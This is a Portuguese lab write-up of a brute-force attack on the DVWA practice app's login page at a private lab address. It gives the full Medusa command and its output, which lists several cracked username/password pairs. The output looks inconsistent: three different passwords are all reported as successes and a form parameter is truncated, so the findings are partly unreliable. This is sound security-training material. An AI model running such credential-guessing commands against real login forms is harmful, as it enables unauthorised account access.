# Análise de Autenticação Web — DVWA

## 1. Ambiente
- **Alvo:** 192.168.56.101
- **Aplicação:** DVWA
- **Endereço:** `http://192.168.56.101/dvwa/login.php`
- **Ferramenta:** Medusa v2.3
- **Nível de segurança:** HIGH

## 2. Comando executado

```bash
medusa -h 192.168.56.101 -U username.txt -P password.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&login=logi' \
-m 'FAIL=login failed' -t 6
```

## 3. Resultado observado

O terminal apresentou diversas mensagens no formato:

```text
ACCOUNT FOUND: [http] Host: 192.168.56.101
User: user Password: msfadmin [SUCCESS]

ACCOUNT FOUND: [http] Host: 192.168.56.101
User: admin Password: password [SUCCESS]

ACCOUNT FOUND: [http] Host: 192.168.56.101
User: root Password: 123456 [SUCCESS]
```
## 4 Conclusão técnica ##

O acesso manual ao DVWA foi realizado com sucesso.

User: admin 

Password: password 